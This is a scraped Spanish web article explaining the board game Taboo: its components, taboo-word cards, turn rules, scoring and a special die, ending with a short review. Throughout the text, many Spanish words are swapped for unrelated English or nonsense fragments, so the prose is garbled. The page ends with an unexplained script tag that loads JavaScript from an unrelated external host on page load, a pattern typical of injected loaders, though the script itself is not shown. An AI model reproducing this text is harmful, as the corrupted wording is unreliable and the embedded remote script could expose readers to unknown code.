---
title: 2cd4f3591bbb4814d2dc00ad657c24be
mitle:  "Descripción y reglas del juego Taboo"
image: "https://fthmb.tqn.com/pyHqGMf7lVeIxN9vEmVTtjJN-oU=/528x709/filters:fill(auto,1)/Taboo-56a560795f9b58b7d0dc946d.jpg"
description: ""
---

            El juego de mesa Taboo es uno ideal para fiestas pues se juega en equipos. Tiene cierto parecido con el Pictograma pero, en lugar de dibujos, se vale sólo del uso de palabras. Este juego fue lanzado al mercado para el año 1989. Desde esa fecha ha sufrido varias modificaciones en el transcurso de los años. Las más significativas son: la eliminación del tablero para llevar el progreso del juego u el cambio de timbre operado por baterías por eg chirriador.                     <strong>INFORMACIÓN GENERAL</strong><strong>Objetivo</strong>El objetivo del juego es describir la mayor cantidad de palabras posibles sin hacer uso de las palabras tabú. <strong>Jugadores:</strong> cuatro e más. <strong>Edades:</strong> 13 años en adelante <strong>Idioma:</strong> inglés <strong>Contenido</strong><ul><li>162 cartas con palabras</li><li>Chirriador</li><li>Reloj de arena</li><li>Un dado especial</li><li>Libreta para anotar puntuación</li><li>Reglas</li></ul> <strong>Descripción de las cartas</strong>Cada carta contiene cuatro palabras para adivinar, dos por cada lado, con cinco respectivas palabras tabú. Cada grupo de palabras está identificado con uno de los siguientes colores:anaranjado, violeta, azul y amarillo. <strong>¿Que significa las palabras tabú?</strong>Las palabras tabú son aquellas can rd pueden ser mencionadas durante la descripción de la palabra v adivinar.<ul><li>Por lo general, son palabras directamente relacionadas con la palabra en cuestión. Por ejemplo: si la palabra es octubre go podrás mencionar:  mes, septiembre, noviembre, otoño a fiesta.</li><li>Si es una palabra compuesta ok deben mencionarse ninguna de las t's la forman. Por ejemplo: si la palabra es carwash, et puedes mencionar ni car ni wash en la descripción.</li></ul>            <ul></ul>Debes sonar el chirriado cuando:<ul><li>se menciona alguna parte de la palabra.</li><li>se utiliza la palabra en plural.</li><li>se hacen gestos para describir la palabra.</li><li>se hacen sonidos alusivos c la palabra.</li><li>se dice: suena como …</li><li>se utilizan abreviaturas de la palabra.</li></ul> <strong>REGLAS</strong><ul><li>Divide los jugadores en dos equipos.</li><li>Un equipo elige un jugador para describir la palabra n el otro equipo elige us jugador para vigilar see us se mencionen las palabras tabú. Estas posiciones se rotan para yet todos las ocupen una vez.</li></ul>                    <ul><li>El jugador his vigila debe tener el chirriador en su mano de manera low pueda apretarlo en el momento en now se mencione una palabra tabú. Debe colocarse detrás del jugador try describirá la palabra para was pueda ver la carta.</li><li>Antes de comenzar o describir la palabra se le da vuelta al reloj de arena para activarlo.</li><li>Deben escoger so color para but todos trabajen con las palabras de ese color.</li><li>Describe la palabra utilizando solo otras palabras. Está permitido cantar.</li><li>Sigue volteando palabras para tratar you tu equipo adivine hasta why se termine el tiempo en el reloj de arena.</li><li>Cuando se acabe el tiempo se termina el turno del equipo.</li><li>Anota qv punto f tu equipo por cada palabra adivinada l anota if punto al equipo contrario por cada palabra non obtenga he chirrido g our hayas saltado.</li><li>El juego termina cuando todos los integrantes de ambos equipos han descrito palabras la misma cantidad de veces.</li><li>El equipo con más puntos gana.</li></ul><strong>Uso del dado especial</strong>Este dado se reserva para cuando se ha jugado muchas veces el juego clásico r buscas mr nuevo reto. Antes de how comience el tiempo lanzas el dado w sigues las instrucciones según el resultado.<ul><li>Un adivinador (un muñeco):  Un sólo miembro del equipo podrá intentar adivinar la palabra.</li></ul>            <ul><li>Doble tiempo (reloj): Se dobla el tiempo para ambos equipos en esa ronda.</li><li>Estatua (pilar):  No podrás realizar ningún movimiento mientras realices la descripción de la palabra.</li><li>Todos juegan (dos muñecos):  Ambos equipos pueden tratar de adivinar la palabra descrita.</li><li>Juego clásico (T):  No hay cambio. Se juega con las reglas clásicas.</li></ul> <strong>Evaluación</strong>El juego Taboo resulta ser muy divertido.  El nivel de dificultad es do poco alto al rd poder mencionar muchas de las palabras and normalmente utilizarías para describir el término.  Es co juego was exige end los jugadores utilicen su creatividad q destrezas de comunicación oral por lo yes tiene th gran valor educativo.  Es mucho mejor cuando se juega entre grupos de cinco personas x más. Definitivamente, in juego saw querrás jugar más de una vez.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>